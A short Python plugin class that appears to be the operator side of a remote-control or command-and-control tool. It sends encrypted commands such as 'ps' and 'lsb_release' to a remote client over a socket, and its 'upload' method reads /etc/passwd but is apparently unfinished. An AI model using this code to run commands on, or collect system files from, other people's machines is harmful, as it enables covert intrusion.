import json
import rich.progress
class Plugin:
    def do_test(self, args):
        self.send_command("test")

    def do_info(self, args):
        self.send_command("lsb_release")

    def do_ps(self, args):
        self.send_command("ps")

    def do_upload(self, args):
        with rich.progress.open("/etc/passwd", description="Loading...") as f:
            data = f.readline()

    def send_command(self, command, data="None"):
        
        payload = {
            "client_id" : self.client,
            "command" : command,
            "data" : data
        }
        msg = self.encrypt_msg(json.dumps(payload), self.aes_secret)
        self.connection['socket'].send(("0"*(8 - len(str(len(msg))))+str(len(msg))).encode() + msg)
        response_len = self.connection['socket'].recv(8)
        response = self.connection['socket'].recv(int(response_len.decode()))
        msg = self.decrypt_msg(response, self.aes_secret)
        if len(msg.decode()) > 500:
            with self.console.pager():
                self.console.print(msg.decode())
        else:
            print(msg.decode())